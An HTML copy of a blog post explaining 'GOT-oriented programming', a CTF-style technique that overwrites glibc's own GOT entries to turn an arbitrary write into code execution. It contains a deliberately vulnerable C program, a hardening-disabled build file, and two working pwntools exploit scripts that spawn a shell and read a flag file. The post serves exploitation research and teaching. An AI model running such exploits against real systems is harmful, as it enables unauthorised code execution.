<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>James Routley | Feed</title>
    <link
      rel="stylesheet"
      type="text/css"
      href="../styles.css"
      media="screen"
    />
  </head>
  <body>
    <a href="/index.html">Back</a>
    <a href="https://feyor.sh/blog/got-oriented-programming/">Original</a>
    <h1>GOT-Oriented Programming</h1>
    
    <div id="readability-page-1" class="page"><div>
  <p>The other day I was working on a pwn challenge and I noticed something interesting: its version of libc had partial RELRO enabled.
To redirect control flow I tried overwriting one of libc’s GOT entries with a one_gadget, but I didn’t have enough register control to pop a shell.
That got me thinking: what if we could use libc’s GOT as a sort of jump table?
This is a technique (itself a specific kind of JOP) <del>I’d like to dub</del><sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup> called “GOT-oriented programming” (GOP).</p>
<p>The GOT overwrite attack is as old as time memoriam; clobber a GOT/PLT entry and redirect execution of a particular function to an attacker controlled address.
Developers have wised up since then and realized the cons of lazy binding GOT entries far outweigh the pros, so an option called full RELRO (<code>-z,now</code>) was implemented which disables lazy binding and makes the GOT read-only.<sup id="fnref:2"><a href="#fn:2" role="doc-noteref">2</a></sup>
Although you usually hear about the GOT in the context of a binary dynamically linked against glibc, glibc has its own GOT to determine at runtime the most efficient version of a function that the hardware supports (stuff like AVX optimized <kbd>memcpy</kbd>).
Because these optimized functions are somewhat common (otherwise, why bother optimizing them), there are many gadgets in libc that setup registers for a function call and then perform an indirect jump to a GOT entry.
In practice, it only takes a few of these “GOP gadgets” to achieve nearly full register control, and from there it’s trivial to get a shell.</p>
<p>To be specific, the requirements for GOP are</p>
<ol>
<li>Libc compiled with partial (or no) RELRO (for Ubuntu, this is <a href="https://salsa.debian.org/glibc-team/glibc/-/commit/3db74a9f5df63f59c8ca805631082424111e4ffd">glibc &lt; 2.39</a>)</li>
<li>Libc leak to defeat ASLR (if applicable)</li>
<li>(Semi-)arbitrary write that can target libc’s GOT</li>
<li>A function in libc’s <code>.got.plt</code> needs to be called at some point after the corruption takes place in order to start the GOP chain</li>
</ol>
<p>I’ve found this to be an interesting way to pivot an arbitrary write to code execution, even if it’s not as fancy as techniques like <kbd>setcontext</kbd>, FSOP, or <kbd>_dini_handler</kbd>.
I’ll demonstrate the power of this technique with a simplified example using glibc 2.43<sup id="fnref:3"><a href="#fn:3" role="doc-noteref">3</a></sup> (compiled with <code>--disable-bind-now</code>):</p>





  
  
    

  
  
    









<details open="">
  
  <summary><p><span>C</span>
      <span>pwnable.c</span>
    </p>
  
  </summary>
  <div><pre tabindex="0"><code data-lang="c"><span><span><span>#include</span> <span>&lt;stdint.h&gt;</span><span>
</span></span></span><span><span><span>#include</span> <span>&lt;unistd.h&gt;</span><span>
</span></span></span><span><span><span>#include</span> <span>&lt;stdio.h&gt;</span><span>
</span></span></span><span><span><span>#include</span> <span>&lt;string.h&gt;</span><span>
</span></span></span><span><span><span></span>
</span></span><span><span><span>int</span> <span>main</span>() {
</span></span><span><span>    <span>setbuf</span>(stdout, <span>NULL</span>);
</span></span><span><span>    <span>printf</span>(<span>&#34;puts() @ %p</span><span>\n</span><span>&#34;</span>, <span>&amp;</span>puts);
</span></span><span><span>
</span></span><span><span>    <span>while</span> (<span>true</span>) {
</span></span><span><span>        <span>uint64_t</span> data <span>=</span> <span>0</span>;
</span></span><span><span>        <span>size_t</span> address;
</span></span><span><span>        <span>printf</span>(<span>&#34;write: &#34;</span>);
</span></span><span><span>        <span>read</span>(<span>0</span>, <span>&amp;</span>data, <span>8</span>);
</span></span><span><span>        <span>if</span> (<span>!</span><span>strncmp</span>(<span>&#34;cancel&#34;</span>, (<span>void</span><span>*</span>)<span>&amp;</span>data, <span>7</span>)) <span>break</span>;
</span></span><span><span>        <span>printf</span>(<span>&#34;where: &#34;</span>);
</span></span><span><span>        <span>read</span>(<span>0</span>, <span>&amp;</span>address, <span>8</span>);
</span></span><span><span>        <span>*</span>(<span>uint64_t</span><span>*</span>)address <span>=</span> data;
</span></span><span><span>    }
</span></span><span><span>
</span></span><span><span>    <span>return</span> <span>0</span>;
</span></span><span><span>}</span></span></code></pre></div>
</details>






  
  
    

  
  
    









<details>
  
  <summary><p><span>Nix</span>
      <span>flake.nix</span>
    </p>
  
  </summary>
  <div><pre tabindex="0"><code data-lang="nix"><span><span>{
</span></span><span><span>  description <span>=</span> <span>&#39;&#39;the best part was when he said &#34;IT&#39;S GOPPIN&#39; TIME&#34; and gopped all over those guys&#39;&#39;</span>;
</span></span><span><span>
</span></span><span><span>  inputs<span>.</span>nixpkgs<span>.</span>url <span>=</span> <span>&#34;github:NixOS/nixpkgs/nixpkgs-unstable&#34;</span>;
</span></span><span><span>
</span></span><span><span>  outputs <span>=</span> { nixpkgs<span>,</span> <span>...</span> }:
</span></span><span><span>    <span>let</span>
</span></span><span><span>      system <span>=</span> <span>&#34;x86_64-linux&#34;</span>;
</span></span><span><span>      lib <span>=</span> nixpkgs<span>.</span>lib;
</span></span><span><span>      pkgs <span>=</span> <span>import</span> nixpkgs { <span>inherit</span> system; };
</span></span><span><span>    <span>in</span>
</span></span><span><span>      {
</span></span><span><span>        packages<span>.</span><span>${</span>system<span>}</span><span>.</span>default <span>=</span> <span>with</span> pkgs; <span>let</span>
</span></span><span><span>          glibc&#39; <span>=</span> stdenv<span>.</span>mkDerivation <span>rec</span> {
</span></span><span><span>            pname <span>=</span> <span>&#34;glibc&#34;</span>;
</span></span><span><span>            version <span>=</span> <span>&#34;2.43&#34;</span>;
</span></span><span><span>
</span></span><span><span>            src <span>=</span> fetchurl {
</span></span><span><span>              url <span>=</span> <span>&#34;mirror://gnu/glibc/glibc-</span><span>${</span>version<span>}</span><span>.tar.xz&#34;</span>;
</span></span><span><span>              hash <span>=</span> <span>&#34;sha256-2chsa12920Oj4IJwxYRPxRd9GUQs9bjfS+fAfNX6ODE=&#34;</span>;
</span></span><span><span>            };
</span></span><span><span>
</span></span><span><span>            nativeBuildInputs <span>=</span> [
</span></span><span><span>              bison
</span></span><span><span>              python3Minimal
</span></span><span><span>            ];
</span></span><span><span>
</span></span><span><span>            NIX_NO_SELF_RPATH <span>=</span> true;
</span></span><span><span>
</span></span><span><span>            preConfigure <span>=</span> <span>&#39;&#39;
</span></span></span><span><span><span>              mkdir build; cd build
</span></span></span><span><span><span>              configureScript=&#34;$(pwd)/../configure&#34;
</span></span></span><span><span><span>
</span></span></span><span><span><span>              export NIX_DONT_SET_RPATH=1
</span></span></span><span><span><span>            &#39;&#39;</span>;
</span></span><span><span>
</span></span><span><span>            configureFlags <span>=</span> [
</span></span><span><span>              (lib<span>.</span>enableFeature false <span>&#34;bind-now&#34;</span>)
</span></span><span><span>              (lib<span>.</span>enableFeature true <span>&#34;cet&#34;</span>)
</span></span><span><span>            ];
</span></span><span><span>
</span></span><span><span>            hardeningDisable <span>=</span> [
</span></span><span><span>              <span>&#34;fortify&#34;</span>
</span></span><span><span>              <span>&#34;bindnow&#34;</span>
</span></span><span><span>            ];
</span></span><span><span>          };
</span></span><span><span>          gcc&#39; <span>=</span> wrapCCWith {
</span></span><span><span>            cc <span>=</span> gcc-unwrapped;
</span></span><span><span>            libc <span>=</span> glibc&#39;;
</span></span><span><span>            bintools <span>=</span> binutils<span>.</span>override { libc <span>=</span> glibc&#39;; };
</span></span><span><span>          };
</span></span><span><span>          stdenv&#39; <span>=</span> overrideCC stdenv gcc&#39;;
</span></span><span><span>        <span>in</span>
</span></span><span><span>          stdenv&#39;<span>.</span>mkDerivation {
</span></span><span><span>            name <span>=</span> <span>&#34;pwnable&#34;</span>;
</span></span><span><span>            src <span>=</span> <span>./.</span>;
</span></span><span><span>
</span></span><span><span>            env <span>=</span> {
</span></span><span><span>              NIX_CFLAGS_COMPILE <span>=</span> <span>&#34;-fcf-protection=full&#34;</span>;
</span></span><span><span>              NIX_LDFLAGS <span>=</span> <span>&#34;-z cet-report=error&#34;</span>;
</span></span><span><span>            };
</span></span><span><span>
</span></span><span><span>            buildPhase <span>=</span> <span>&#34;$CC pwnable.c -o pwnable&#34;</span>;
</span></span><span><span>            installPhase <span>=</span> <span>&#34;mv pwnable $out&#34;</span>;
</span></span><span><span>          };
</span></span><span><span>      };
</span></span><span><span>}</span></span></code></pre></div>
</details>

<p>To start, we should investigate what functions are in glibc’s GOT:</p>
<figure><img src="https://feyor.sh/blog/got-oriented-programming/binja.png"/>
</figure>

<p>Next, let’s investigate which of the above functions are called throughout the program.
Nothing is called as part of glibc’s <kbd>exit</kbd> routine, but what about in the core loop?</p>





  
  
    

  
  
    









<details open="">
  
  <summary>GDB</summary>
  
  
  <pre tabindex="0"><code data-lang="gdb-script">start
# first printf
tb *main+148
c
record btrace
set record btrace bts buffer-size unlimited
# second printf
tb *main+94
c
set record function-call-history-size unlimited
record function-call-history /c</code></pre>
</details>






  
  
    

  
  
    









<div><div>
<table><tbody><tr><td>
<pre tabindex="0"><code><span id="org-coderef--2ebd36-1"><a href="#org-coderef--2ebd36-1"> 1</a>
</span><span id="org-coderef--2ebd36-2"><a href="#org-coderef--2ebd36-2"> 2</a>
</span><span id="org-coderef--2ebd36-3"><a href="#org-coderef--2ebd36-3"> 3</a>
</span><span id="org-coderef--2ebd36-4"><a href="#org-coderef--2ebd36-4"> 4</a>
</span><span id="org-coderef--2ebd36-5"><a href="#org-coderef--2ebd36-5"> 5</a>
</span><span id="org-coderef--2ebd36-6"><a href="#org-coderef--2ebd36-6"> 6</a>
</span><span id="org-coderef--2ebd36-7"><a href="#org-coderef--2ebd36-7"> 7</a>
</span><span id="org-coderef--2ebd36-8"><a href="#org-coderef--2ebd36-8"> 8</a>
</span><span id="org-coderef--2ebd36-9"><a href="#org-coderef--2ebd36-9"> 9</a>
</span><span id="org-coderef--2ebd36-10"><a href="#org-coderef--2ebd36-10">10</a>
</span><span id="org-coderef--2ebd36-11"><a href="#org-coderef--2ebd36-11">11</a>
</span><span id="org-coderef--2ebd36-12"><a href="#org-coderef--2ebd36-12">12</a>
</span><span id="org-coderef--2ebd36-13"><a href="#org-coderef--2ebd36-13">13</a>
</span><span id="org-coderef--2ebd36-14"><a href="#org-coderef--2ebd36-14">14</a>
</span><span id="org-coderef--2ebd36-15"><a href="#org-coderef--2ebd36-15">15</a>
</span><span id="org-coderef--2ebd36-16"><a href="#org-coderef--2ebd36-16">16</a>
</span><span id="org-coderef--2ebd36-17"><a href="#org-coderef--2ebd36-17">17</a>
</span><span id="org-coderef--2ebd36-18"><a href="#org-coderef--2ebd36-18">18</a>
</span><span id="org-coderef--2ebd36-19"><a href="#org-coderef--2ebd36-19">19</a>
</span><span id="org-coderef--2ebd36-20"><a href="#org-coderef--2ebd36-20">20</a>
</span><span id="org-coderef--2ebd36-21"><a href="#org-coderef--2ebd36-21">21</a>
</span><span id="org-coderef--2ebd36-22"><a href="#org-coderef--2ebd36-22">22</a>
</span><span id="org-coderef--2ebd36-23"><a href="#org-coderef--2ebd36-23">23</a>
</span><span id="org-coderef--2ebd36-24"><a href="#org-coderef--2ebd36-24">24</a>
</span><span id="org-coderef--2ebd36-25"><a href="#org-coderef--2ebd36-25">25</a>
</span><span id="org-coderef--2ebd36-26"><a href="#org-coderef--2ebd36-26">26</a>
</span><span id="org-coderef--2ebd36-27"><a href="#org-coderef--2ebd36-27">27</a>
</span><span id="org-coderef--2ebd36-28"><a href="#org-coderef--2ebd36-28">28</a>
</span><span id="org-coderef--2ebd36-29"><a href="#org-coderef--2ebd36-29">29</a>
</span><span id="org-coderef--2ebd36-30"><a href="#org-coderef--2ebd36-30">30</a>
</span><span id="org-coderef--2ebd36-31"><a href="#org-coderef--2ebd36-31">31</a>
</span><span id="org-coderef--2ebd36-32"><a href="#org-coderef--2ebd36-32">32</a>
</span><span id="org-coderef--2ebd36-33"><a href="#org-coderef--2ebd36-33">33</a>
</span><span id="org-coderef--2ebd36-34"><a href="#org-coderef--2ebd36-34">34</a>
</span><span id="org-coderef--2ebd36-35"><a href="#org-coderef--2ebd36-35">35</a>
</span><span id="org-coderef--2ebd36-36"><a href="#org-coderef--2ebd36-36">36</a>
</span><span id="org-coderef--2ebd36-37"><a href="#org-coderef--2ebd36-37">37</a>
</span><span id="org-coderef--2ebd36-38"><a href="#org-coderef--2ebd36-38">38</a>
</span><span id="org-coderef--2ebd36-39"><a href="#org-coderef--2ebd36-39">39</a>
</span><span id="org-coderef--2ebd36-40"><a href="#org-coderef--2ebd36-40">40</a>
</span><span id="org-coderef--2ebd36-41"><a href="#org-coderef--2ebd36-41">41</a>
</span><span id="org-coderef--2ebd36-42"><a href="#org-coderef--2ebd36-42">42</a>
</span><span id="org-coderef--2ebd36-43"><a href="#org-coderef--2ebd36-43">43</a>
</span><span id="org-coderef--2ebd36-44"><a href="#org-coderef--2ebd36-44">44</a>
</span><span id="org-coderef--2ebd36-45"><a href="#org-coderef--2ebd36-45">45</a>
</span><span id="org-coderef--2ebd36-46"><a href="#org-coderef--2ebd36-46">46</a>
</span><span id="org-coderef--2ebd36-47"><a href="#org-coderef--2ebd36-47">47</a>
</span><span id="org-coderef--2ebd36-48"><a href="#org-coderef--2ebd36-48">48</a>
</span><span id="org-coderef--2ebd36-49"><a href="#org-coderef--2ebd36-49">49</a>
</span><span id="org-coderef--2ebd36-50"><a href="#org-coderef--2ebd36-50">50</a>
</span></code></pre></td>
<td>
<pre tabindex="0"><code data-lang="text"><span><span>main
</span></span><span><span>  __printf_chk@plt
</span></span><span><span>    __printf_chk
</span></span><span><span>      __vfprintf_internal
</span></span><span><span>        __printf_buffer_to_file_init
</span></span><span><span>          __printf_buffer_to_file_switch
</span></span><span><span>      __vfprintf_internal
</span></span><span><span>        __printf_buffer
</span></span><span><span>          *ABS*+0xb0140@plt
</span></span><span><span>            __strchrnul_avx2_rtm
</span></span><span><span>        __printf_buffer
</span></span><span><span>          __printf_buffer_write
</span></span><span><span>            *ABS*+0xae6a0@plt
</span></span><span><span>              __memmove_avx_unaligned_erms_rtm
</span></span><span><span>          __printf_buffer_write
</span></span><span><span>        __printf_buffer
</span></span><span><span>      __vfprintf_internal
</span></span><span><span>        __printf_buffer_to_file_done
</span></span><span><span>          __printf_buffer_flush_to_file
</span></span><span><span>            __GI__IO_file_xsputn
</span></span><span><span>              __GI__IO_file_overflow
</span></span><span><span>                __GI__IO_do_write
</span></span><span><span>            __GI__IO_file_xsputn
</span></span><span><span>              new_do_write
</span></span><span><span>                _IO_file_write@@GLIBC_2.2.5
</span></span><span><span>                  write
</span></span><span><span>                    __syscall_cancel
</span></span><span><span>                      __internal_syscall_cancel
</span></span><span><span>                    __syscall_cancel
</span></span><span><span>                  write
</span></span><span><span>                _IO_file_write@@GLIBC_2.2.5
</span></span><span><span>              new_do_write
</span></span><span><span>            __GI__IO_file_xsputn
</span></span><span><span>          __printf_buffer_flush_to_file
</span></span><span><span>            __printf_buffer_to_file_switch
</span></span><span><span>        __printf_buffer_to_file_done
</span></span><span><span>          __printf_buffer_done
</span></span><span><span>      __vfprintf_internal
</span></span><span><span>    __printf_chk
</span></span><span><span>main
</span></span><span><span>  read@plt
</span></span><span><span>    read
</span></span><span><span>      __syscall_cancel
</span></span><span><span>        __internal_syscall_cancel
</span></span><span><span>      __syscall_cancel
</span></span><span><span>    read
</span></span><span><span>main
</span></span><span><span>  strcmp@plt
</span></span><span><span>    __strcmp_avx2_rtm
</span></span><span><span>main</span></span></code></pre></td></tr></tbody></table>
</div>
</div>

<p>Aha! <kbd>printf</kbd> ends up calling <a href="#org-coderef--2ebd36-9">strchrnul</a> and <a href="#org-coderef--2ebd36-13">memcpy</a> through their <code>.got.plt</code> entries, which we can hijack!<sup id="fnref:4"><a href="#fn:4" role="doc-noteref">4</a></sup>
Note that the functions <code>read@plt</code> and <code>strcmp@plt</code> are entries in <em>our program</em>’s GOT, not libc’s.</p>
<p>Now, given the completely arbitrary write and libc leak there are a myriad of ways to achieve code execution, but let’s try some GOP.
To up the ante, I will only consider gadgets that start at the beginning of functions so our exploit will work <strong>even if IBT is enabled</strong>.<sup id="fnref:5"><a href="#fn:5" role="doc-noteref">5</a></sup></p>
<p>We have very limited stack control and absolutely no register control when either of <kbd>strchrnul</kbd> or <kbd>memcpy</kbd> are called, so we need a gadget that can read the contents of writable libc memory into a register.
After some searching I came across this guy:</p>





  
  
    

  
  
    









<details open="">
  
  <summary>ASM</summary>
  
  
  <div><pre tabindex="0"><code data-lang="asm"><span><span>__error_at_line_internal:
</span></span><span><span>    <span>// ...
</span></span></span><span><span><span></span>    <span>mov</span>     rax, qword [rel error_one_per_line]
</span></span><span><span>    <span>mov</span>     dword [rbp-0x44 {var_4c}], edi
</span></span><span><span>    <span>mov</span>     eax, dword [rax]
</span></span><span><span>    <span>test</span>    eax, eax
</span></span><span><span>    <span>je</span>      label1
</span></span><span><span>label1:
</span></span><span><span>    <span>cmp</span>     dword [rel old_line_number.0], ecx
</span></span><span><span>    <span>je</span>      label2
</span></span><span><span>label2:
</span></span><span><span>    <span>mov</span>     rdi, qword [rel old_file_name.1]
</span></span><span><span>    <span>cmp</span>     rdi, rdx
</span></span><span><span>    <span>je</span>      bad
</span></span><span><span>    <span>test</span>    rdx, rdx
</span></span><span><span>    <span>je</span>      bad
</span></span><span><span>    <span>test</span>    rdi, rdi
</span></span><span><span>    <span>je</span>      bad
</span></span><span><span>    <span>mov</span>     rsi, rdx
</span></span><span><span>    <span>call</span>    j___GI_strcmp
</span></span><span><span>bad:
</span></span><span><span>    // ...</span></span></code></pre></div>
</details>

<p>There’s a lot of unrelated stuff going on, but the general idea is that <code>rdi</code> is set to the value of a variable in libc’s <code>.bss</code> section (<kbd>old_file_name</kbd>) before jumping to a <code>.got.plt</code> function (<kbd>strcmp</kbd>).
The conditions we need to meet for this codepath are</p>
<ol>
<li><span data-lang="c"><code>error_one_per_line != 0</code></span></li>
<li><span data-lang="c"><code>old_line_number == ecx</code></span> (here <code>ecx</code> is 2)</li>
<li><span data-lang="c"><code>old_file_name != rdx &amp;&amp; old_file_name != 0 &amp;&amp; rdx != 0</code></span> (the first two conditions are trivial because we want to control <kbd>old_file_name</kbd> anyway, and <code>rdx</code> happens to be nonzero)</li>
</ol>
<p>Let’s try it:</p>





  
  
    

  
  
    









<details open="">
  
  <summary>Python</summary>
  
  
  <div><pre tabindex="0"><code data-lang="python"><span><span><span>from</span> pwn <span>import</span> <span>*</span>
</span></span><span><span>
</span></span><span><span>context<span>.</span>log_level <span>=</span> <span>&#39;warning&#39;</span>
</span></span><span><span>
</span></span><span><span>elf <span>=</span> context<span>.</span>binary <span>=</span> ELF(<span>&#34;pwnable&#34;</span>)
</span></span><span><span>libc <span>=</span> ELF(elf<span>.</span>runpath<span>.</span>split(<span>b</span><span>&#39;:&#39;</span>)[<span>1</span>] <span>+</span> <span>b</span><span>&#34;/libc.so.6&#34;</span>)
</span></span><span><span>
</span></span><span><span><span>def</span> <span>write</span>(data, location):
</span></span><span><span>    p<span>.</span>sendafter(<span>b</span><span>&#34;write: &#34;</span>, data)
</span></span><span><span>    p<span>.</span>sendafter(<span>b</span><span>&#34;where: &#34;</span>, p64(location))
</span></span><span><span>
</span></span><span><span>p <span>=</span> remote(<span>&#34;localhost&#34;</span>, <span>1337</span>)
</span></span><span><span>
</span></span><span><span>p<span>.</span>recvuntil(<span>b</span><span>&#34;puts() @ &#34;</span>)
</span></span><span><span>libc<span>.</span>address <span>=</span> <span>int</span>(p<span>.</span>recvline(), <span>16</span>) <span>-</span> libc<span>.</span>sym<span>.</span>puts
</span></span><span><span>
</span></span><span><span>write(p8(<span>1</span>), libc<span>.</span>sym<span>.</span>error_one_per_line)
</span></span><span><span>write(p8(<span>2</span>), libc<span>.</span>sym<span>.</span>old_line_number[<span>&#39;0&#39;</span>])
</span></span><span><span>write(p64(<span>next</span>(libc<span>.</span>search(<span>b</span><span>&#34;/bin/sh</span><span>\x00</span><span>&#34;</span>))), libc<span>.</span>sym<span>.</span>old_file_name[<span>&#39;1&#39;</span>])
</span></span><span><span>
</span></span><span><span>write(p64(libc<span>.</span>sym<span>.</span>system), libc<span>.</span>got[<span>&#34;__GI_strcmp&#34;</span>])
</span></span><span><span>write(p64(libc<span>.</span>sym<span>.</span>__error_at_line_internal), libc<span>.</span>got[<span>&#34;__GI___strchrnul&#34;</span>])
</span></span><span><span>
</span></span><span><span>p<span>.</span>sendline(<span>b</span><span>&#34;id&#34;</span>)
</span></span><span><span><span>print</span>(p<span>.</span>recvline())</span></span></code></pre></div>
</details>






  
  
    

  
  
    









<div><pre tabindex="0"><code data-lang="text"><span><span>b&#39;uid=1000(pwny) gid=100(users) groups=100(users),1(wheel)\n&#39;</span></span></code></pre></div>

<p>But that’s a very short chain… what if we needed to cat the flag without a shell?
Here’s a (likely overcomplicated) GOP chain used to print the contents of <code>&#34;/tmp/flag.txt&#34;</code> and then cleanly exit the program:</p>





  
  
    

  
  
    









<details open="">
  
  <summary>Python</summary>
  
  
  <div><pre tabindex="0"><code data-lang="python"><span><span><span>from</span> pwn <span>import</span> <span>*</span>
</span></span><span><span>
</span></span><span><span>context<span>.</span>log_level <span>=</span> <span>&#39;warning&#39;</span>
</span></span><span><span>
</span></span><span><span>elf <span>=</span> context<span>.</span>binary <span>=</span> ELF(<span>&#34;pwnable&#34;</span>)
</span></span><span><span>libc <span>=</span> ELF(elf<span>.</span>runpath<span>.</span>split(<span>b</span><span>&#39;:&#39;</span>)[<span>1</span>] <span>+</span> <span>b</span><span>&#34;/libc.so.6&#34;</span>)
</span></span><span><span>
</span></span><span><span><span>def</span> <span>write</span>(data, location):
</span></span><span><span>    p<span>.</span>sendafter(<span>b</span><span>&#34;write: &#34;</span>, data)
</span></span><span><span>    p<span>.</span>sendafter(<span>b</span><span>&#34;where: &#34;</span>, p64(location))
</span></span><span><span>
</span></span><span><span>p <span>=</span> remote(<span>&#34;localhost&#34;</span>, <span>1337</span>)
</span></span><span><span>
</span></span><span><span>p<span>.</span>recvuntil(<span>b</span><span>&#34;puts() @ &#34;</span>)
</span></span><span><span>libc<span>.</span>address <span>=</span> <span>int</span>(p<span>.</span>recvline(), <span>16</span>) <span>-</span> libc<span>.</span>sym<span>.</span>puts
</span></span><span><span>
</span></span><span><span>write(p8(<span>1</span>), libc<span>.</span>sym<span>.</span>error_one_per_line)
</span></span><span><span>write(p8(<span>2</span>), libc<span>.</span>sym<span>.</span>old_line_number[<span>&#39;0&#39;</span>])
</span></span><span><span>write(<span>b</span><span>&#34;/tmp/flag.txt</span><span>\x00</span><span>&#34;</span>[:<span>8</span>], libc<span>.</span>sym<span>.</span>tmpnam_buffer)
</span></span><span><span>write(<span>b</span><span>&#34;/tmp/flag.txt</span><span>\x00</span><span>&#34;</span>[<span>8</span>:], libc<span>.</span>sym<span>.</span>tmpnam_buffer<span>+</span><span>8</span>)
</span></span><span><span>write(p64(libc<span>.</span>sym<span>.</span>tmpnam_buffer), libc<span>.</span>sym<span>.</span>old_file_name[<span>&#39;1&#39;</span>])
</span></span><span><span>write(p64(libc<span>.</span>sym<span>.</span>__libc_procutils_read_file), libc<span>.</span>got[<span>&#34;__GI_strcmp&#34;</span>])
</span></span><span><span>
</span></span><span><span>write(p64(libc<span>.</span>sym<span>.</span>explicit_bzero), libc<span>.</span>got[<span>&#34;__GI_memchr&#34;</span>])
</span></span><span><span>write(p64(libc<span>.</span>sym<span>.</span>puts), libc<span>.</span>got[<span>&#34;__GI_memset&#34;</span>])
</span></span><span><span>
</span></span><span><span>write(p64(libc<span>.</span>sym<span>.</span>_exit), libc<span>.</span>got[<span>&#34;__GI___strnlen&#34;</span>])
</span></span><span><span>write(p64(libc<span>.</span>sym<span>.</span>__error_at_line_internal), libc<span>.</span>got[<span>&#34;__GI_strpbrk&#34;</span>])
</span></span><span><span>write(p64(libc<span>.</span>sym<span>.</span>__nss_valid_field), libc<span>.</span>got[<span>&#34;__GI_strchr&#34;</span>])
</span></span><span><span>write(p64(libc<span>.</span>sym<span>.</span>putenv), libc<span>.</span>got[<span>&#34;__GI___strchrnul&#34;</span>])
</span></span><span><span>
</span></span><span><span>p<span>.</span>recvline()
</span></span><span><span><span>print</span>(p<span>.</span>recvline())</span></span></code></pre></div>
</details>






  
  
    

  
  
    











<p>Clearly this is a very versatile technique!</p>
<p>As I said, you’re unlikely to find a modern version of glibc compiled with partial RELRO in the wild, but hopefully this can serve as a tool for more contrived situations like CTFs.
I also wanted to mention related works by <a href="https://github.com/n132/Libc-GOT-Hijacking">n132</a> and <a href="https://hackmd.io/@pepsipu/SyqPbk94a">pepsipu</a>; although these are not quite the same thing as GOP, they are still interesting (and perhaps more practical) examples of pivoting an arbitrary write into code execution.</p>

</div></div>
  </body>
</html>
